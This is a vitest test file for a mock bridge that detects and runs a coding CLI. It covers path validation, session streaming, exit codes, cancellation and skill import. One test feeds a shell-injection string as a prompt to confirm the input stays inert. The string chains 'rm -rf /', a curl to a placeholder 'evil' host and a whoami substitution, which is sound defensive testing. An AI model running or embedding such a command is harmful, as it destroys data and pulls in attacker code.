import { describe, expect, it } from 'vitest';
import { MockBridge, usageFromEvents } from './mockBridge';
import type { SessionEvent } from './types';

function collect(bridge: MockBridge): SessionEvent[] {
  const events: SessionEvent[] = [];
  void bridge.onSessionEvent((e) => events.push(e));
  return events;
}

describe('MockBridge detection & auth', () => {
  it('reports detection with a real checkedAt timestamp', async () => {
    const bridge = new MockBridge();
    const result = await bridge.detectClaudeCode();
    expect(result.found).toBe(true);
    expect(new Date(result.checkedAt).toString()).not.toBe('Invalid Date');
  });

  it('can simulate CLI missing', async () => {
    const bridge = new MockBridge({
      detection: { found: false, path: null, version: null, source: 'none' },
    });
    const result = await bridge.detectClaudeCode();
    expect(result.found).toBe(false);
    expect(result.path).toBeNull();
  });
});

describe('MockBridge project validation', () => {
  it('accepts an absolute Windows path', async () => {
    const bridge = new MockBridge();
    expect((await bridge.validateProject('C:\\proj')).valid).toBe(true);
  });

  it('rejects a relative/unsafe path', async () => {
    const bridge = new MockBridge();
    const result = await bridge.validateProject('relative/path');
    expect(result.valid).toBe(false);
    expect(result.reason).toBe('unsafe_path');
  });

  it('can simulate permission denied', async () => {
    const bridge = new MockBridge({ invalidProjectReason: 'permission_denied' });
    const result = await bridge.validateProject('C:\\proj');
    expect(result.valid).toBe(false);
    expect(result.readable).toBe(false);
  });
});

describe('MockBridge session lifecycle', () => {
  it('streams stdout, stderr and a structured result, then exits 0', async () => {
    const bridge = new MockBridge();
    const events = collect(bridge);
    const { sessionId } = await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();

    expect(events[0]?.type).toBe('session_started');
    expect(events.some((e) => e.type === 'stderr_chunk')).toBe(true);
    expect(events.some((e) => e.type === 'structured_cli_event')).toBe(true);
    const exit = events.find((e) => e.type === 'session_exited');
    expect(exit && exit.type === 'session_exited' ? exit.code : null).toBe(0);
    expect(exit && exit.type === 'session_exited' ? exit.ok : false).toBe(true);
    expect(sessionId).toMatch(/^mock-session-/);
  });

  it('derives trustworthy usage from the result event', async () => {
    const bridge = new MockBridge();
    const events = collect(bridge);
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();
    const usage = usageFromEvents(events);
    expect(usage.provided).toBe(true);
    expect(usage.costUsd).toBeCloseTo(0.0042);
  });

  it('preserves unicode output', async () => {
    const bridge = new MockBridge();
    const events = collect(bridge);
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();
    const text = events
      .filter((e) => e.type === 'stdout_chunk')
      .map((e) => (e.type === 'stdout_chunk' ? e.text : ''))
      .join('');
    expect(text).toContain('unicodé ✅');
  });

  it('reports a nonzero exit as a failure', async () => {
    const bridge = new MockBridge({ exitCode: 2, script: [{ stream: 'stdout', text: 'boom\n' }] });
    const events = collect(bridge);
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();
    const exit = events.find((e) => e.type === 'session_exited');
    expect(exit && exit.type === 'session_exited' ? exit.code : null).toBe(2);
    expect(exit && exit.type === 'session_exited' ? exit.ok : true).toBe(false);
  });

  it('rejects when the process fails to spawn', async () => {
    const bridge = new MockBridge({ spawnFailure: 'spawn EACCES' });
    await expect(
      bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' }),
    ).rejects.toThrow('spawn EACCES');
  });

  it('cancels a running session with a real exit event', async () => {
    const bridge = new MockBridge({
      stepDelayMs: 1000,
      script: [{ stream: 'stdout', text: 'slow\n' }],
    });
    const events = collect(bridge);
    const { sessionId } = await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.stopSession(sessionId);
    await bridge.whenIdle();

    expect(events.some((e) => e.type === 'session_stopping')).toBe(true);
    const exit = events.find((e) => e.type === 'session_exited');
    expect(exit && exit.type === 'session_exited' ? exit.signal : null).toBe(15);
    expect(exit && exit.type === 'session_exited' ? exit.ok : true).toBe(false);
  });

  it('handles empty output without emitting fake events', async () => {
    const bridge = new MockBridge({ script: [] });
    const events = collect(bridge);
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();
    expect(events.some((e) => e.type === 'stdout_chunk')).toBe(false);
    expect(events.filter((e) => e.type === 'session_exited')).toHaveLength(1);
  });

  it('streams large output without dropping the exit event', async () => {
    const big = 'x'.repeat(4096);
    const bridge = new MockBridge({
      script: Array.from({ length: 50 }, () => ({ stream: 'stdout' as const, text: big + '\n' })),
    });
    const events = collect(bridge);
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: 'hi' });
    await bridge.whenIdle();
    expect(events.filter((e) => e.type === 'stdout_chunk')).toHaveLength(50);
    expect(events.some((e) => e.type === 'session_exited')).toBe(true);
  });

  it('treats prompts with shell metacharacters as inert data', async () => {
    const bridge = new MockBridge();
    const events = collect(bridge);
    const evil = 'hello; rm -rf / && $(curl http://evil) `whoami` | cat';
    await bridge.startSession({ projectPath: 'C:\\proj', prompt: evil });
    await bridge.whenIdle();
    // The mock never executes the prompt; it only emits the scripted stream.
    expect(events.some((e) => e.type === 'session_exited')).toBe(true);
  });
});

describe('MockBridge provider config safety', () => {
  it('returns a preview with a backup path and redacted contents', async () => {
    const bridge = new MockBridge();
    const preview = await bridge.previewProviderConfig('user');
    expect(preview.backupPath).not.toBeNull();
    expect(preview.targetPath).toContain('settings.json');
  });
});

describe('MockBridge skills never execute', () => {
  it('imports a skill as metadata only', async () => {
    const bridge = new MockBridge();
    const skill = await bridge.importSkill('C:\\skills\\demo');
    expect(skill.containsScripts).toBe(false);
    expect(await bridge.listSkills()).toHaveLength(1);
    await bridge.removeSkill(skill.path);
    expect(await bridge.listSkills()).toHaveLength(0);
  });
});
